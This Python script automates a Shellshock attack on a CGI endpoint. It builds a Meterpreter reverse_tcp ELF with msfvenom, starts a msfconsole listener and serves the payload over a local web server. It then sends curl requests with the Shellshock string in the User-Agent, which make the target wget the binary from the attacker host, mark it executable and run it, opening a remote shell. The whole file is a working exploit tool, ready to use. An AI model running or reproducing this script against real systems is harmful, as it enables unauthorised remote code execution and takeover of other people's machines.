import argparse
import http.server
import multiprocessing
import random
import requests
import socketserver
import string
import subprocess
import os
import time
import glob
from shutil import copyfile
from pathlib import Path

__auth__ = 'Jayson Grace'

def __parse_args__():
    """Parse CLI arguments.
    """
    parser = argparse.ArgumentParser(description='Use shellshock to get a shell to a system.')
    parser.add_argument('-l', '--lhost', help='Local IP Address', required=True)
    parser.add_argument('-r', '--rhost', help='Remote IP Address', required=True)
    return parser.parse_args()

def run_cmd(cmd):
    p = subprocess.Popen(cmd, stdout=subprocess.PIPE, shell=True)
    (output, err) = p.communicate()
    p_status = p.wait()
    return output

def id_generator(size=20, chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def gen_elf(args):
    elf_file = f"{id_generator()}.elf"
    lhost = args.lhost
    lport = random.randint(9000,10000)
    run_cmd(f"msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={lhost} LPORT={lport} -f elf > {elf_file}")
    print(f"Generated rc file {elf_file} with LPORT {lport}")
    return elf_file,lport

def start_listener(rhost, lhost, lport):
    print(rhost)
    print(lhost)
    print(lport)
    run_cmd(f"gnome-terminal --tab --active -- bash -c 'msfconsole -r shellshock.rc {rhost} {lhost} {lport}; exec bash'")

# Modified from https://stackoverflow.com/questions/34932268/python-run-simplehttpserver-and-make-request-to-it-in-a-script
def start_webserver():
    web_lport = 8000
    url = f"localhost:{web_lport}"

    handler = http.server.SimpleHTTPRequestHandler
    httpd = socketserver.TCPServer(("", web_lport), handler)
    print(f"Web server starting on port {web_lport}")

    server_process = multiprocessing.Process(target=httpd.serve_forever)
    server_process.daemon = True
    server_process.start()

    return server_process

def rev_shell_target(args, elf_file):
    run_cmd(f"curl -m 3 -A '() {{ test;}};echo \"Content-type: text/plain\"; echo; echo; /usr/bin/wget http://{args.lhost}:8000/{elf_file} -O /tmp/{elf_file}' http://{args.rhost}/cgi-bin/stats")
    run_cmd(f"curl -m 3 -A '() {{ test;}};echo \"Content-type: text/plain\"; echo; echo; /bin/chmod +x /tmp/{elf_file}' http://{args.rhost}/cgi-bin/stats")
    run_cmd(f"curl -m 3 -A '() {{ test;}};echo \"Content-type: text/plain\"; echo; echo; /tmp/{elf_file}' http://{args.rhost}/cgi-bin/stats")

def cleanup():
    print('Cleaning up local elf files')
    for p in Path(".").glob("*.elf"):
        p.unlink()

def main():
    args = __parse_args__()
    elf_file, lport = gen_elf(args)
    start_listener(args.rhost, args.lhost, lport)
    server_process = start_webserver()
    rev_shell_target(args,elf_file)
    print("Closing web server running on port 8000")
    server_process.terminate()
    cleanup()

if __name__ == '__main__':
    main()
